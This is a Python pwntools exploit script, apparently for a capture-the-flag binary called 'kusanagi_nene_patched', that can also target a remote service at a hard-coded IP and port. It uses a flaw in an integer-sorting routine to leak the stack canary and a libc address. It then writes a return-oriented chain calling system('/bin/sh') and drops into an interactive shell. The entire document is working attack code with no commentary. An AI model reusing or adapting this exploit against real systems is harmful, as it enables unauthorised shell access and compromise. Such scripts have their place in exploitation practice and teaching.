#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# context.arch = "i386"
# context.log_level = 'DEBUG'

libc = ELF('libc.so.6', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)       


e = ELF('./kusanagi_nene_patched')
elfROP = ROP(e)

if(len(argv) == 2):
    p = connect("143.198.82.110", 8001)
else:
    p = process('./kusanagi_nene_patched')
    # p = gdb.debug('./kusanagi_nene_patched', cmd)

def leak(offset):
    loop = offset
    longmin = -9223372036854775808
    longmax = 9223372036854775807
    buff = 0x41
    zero = 0
    p.sendlineafter("integers: ", str(loop))

    for i in range(loop-1):
        p.sendline(str(longmin))

    p.sendline('AAAA')

    p.recvuntil("Sorted:")
    gen = p.recvline().strip()
    gen = p.recvline().strip()
    gen = gen.split(" ")

    # for i in gen:
    #     print(hex(eval(i)))

    canaryx = eval(gen[0])
    print(hex(canaryx))
    canary = p64(canaryx)
    return canaryx

canaryx = leak(514)
p.sendline("y")

libcleakx = leak(516)
p.sendline("y")

from pprint import pprint as pp
libc.address = libcleakx - libc.symbols['__libc_start_main']  + 48

print("libc", hex(libc.address))

cmd = """
pie 0x0000000000001623
# pie 0x0000000000001510  
# pie 0x00000000000014F0
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)
    sleep(0.2)


def isi(pload, offset):
    loop = offset
    longmin = -9223372036854775808
    longmax = 9223372036854775807
    buff = 0x41
    zero = 0
    p.sendlineafter("integers: ", str(loop))

    for i in range(loop-1):
        p.sendline(str(longmax))

    p.sendline(str(pload))
    p.recvuntil("Sorted:")
    gen = p.recvline().strip()
    gen = p.recvline().strip()
    gen = gen.split(" ")
    # for i in gen:
    #     print(hex(eval(i)))

    p.sendline("y")


poprdi = 0x000000000002a3e5 # : pop rdi ; ret
ret = 0x0000000000029cd6 ## : ret

binsh = next(libc.search('/bin/sh'))

# ret ; poprdi ; binsh ; system
isi(libc.symbols['system'], 519)
isi(binsh, 518)
isi(libc.address + poprdi, 517)
isi(libc.address + ret, 516)
isi(canaryx, 514)
print("libc", hex(libc.address))


p.sendline('n')
p.sendline('n')

p.interactive()